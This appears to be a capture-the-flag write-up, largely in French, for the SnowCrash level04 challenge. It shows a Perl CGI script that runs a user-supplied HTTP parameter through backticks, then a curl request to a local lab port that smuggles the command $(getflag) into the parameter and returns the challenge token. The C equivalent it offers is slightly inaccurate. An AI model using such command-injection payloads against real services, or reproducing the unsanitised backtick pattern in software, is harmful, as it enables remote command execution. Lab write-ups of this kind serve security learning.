# LEVEL04

``` bash
level04@SnowCrash:/var/www/level04$ find / -user flag04 2>/dev/null
/var/www/level04
/var/www/level04/level04.pl
/rofs/var/www/level04
/rofs/var/www/level04/level04.pl
```

``` bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile

level01@SnowCrash:/var$ cd www
level01@SnowCrash:/var/www$ ls -la
total 4
drwxr-xr-x  1 root   root    100 Mar  2 11:20 .
drwxr-xr-x  1 root   root    160 Mar 12  2016 ..
-r-xr-x---+ 1 root   root    177 Aug 30  2015 index.html
dr-xr-x---+ 2 flag04 level04  60 Mar  2 11:20 level04
dr-xr-x---+ 2 flag12 level12  60 Mar  2 11:20 level12

level04@SnowCrash:/var/www/level04$ ls -la
total 4
dr-xr-x---+ 2 flag04 level04  60 Mar  5 10:43 .
drwxr-xr-x  1 root   root    100 Mar  5 10:43 ..
-r-xr-x---+ 1 flag04 level04 152 Mar  5 10:43 level04.pl

```

``` perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print` echo $y 2>&1`;
}
x(param("x"));
```
executer echo
recuperer stdout et l'imprimer

Avec 2>&1 on affiche aussi les erreurs

param recupere les parametres http

similaire a :

``` c
#include <cgi.h>

void x(char *arg)
{
    char *y = arg;
    system("echo y");
}

int main()
{
    printf("Content-type: text/html\n\n");
    x(param("x"));
}
```

Ici les commandes expand directement le resultat de getflag dans la premiere commande bash
``` bash
level04@SnowCrash:~$ curl http://localhost:4747?x=$(getflag)
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''

level04@SnowCrash:~$ curl http://localhost:4747?x="$(getflag)"
curl: (3) Illegal characters found in URL
```

Ici on expand pas directement comme on utilise des simple quotes

``` bash
level04@SnowCrash:~$ curl http://localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

level04@SnowCrash:~$ curl 'http://localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap



```

avec ' ' rien nest interprete, cest le deuxieme shell, celui du programme qui va interpreter
avec " " certaines expansions sont valides
Les espaces sont interdits dans une URL donc -> Illegal characters found in URL
le shell local envoie litteralement -> http://localhost:4747?x=$(getflag)

$ls -> valeur de la variable (ex: ls="coucoucou")
$(ls) -> execute la commande et remplace par sa sortie(ex: file1 file2 file3)
`ls` === $(ls)

les backticks Perl `commande` font /bin/sh -c "commande"
le shell fait les substitution avant d'executer la commande

Remote Command Execution (RCE) = user input -> shell command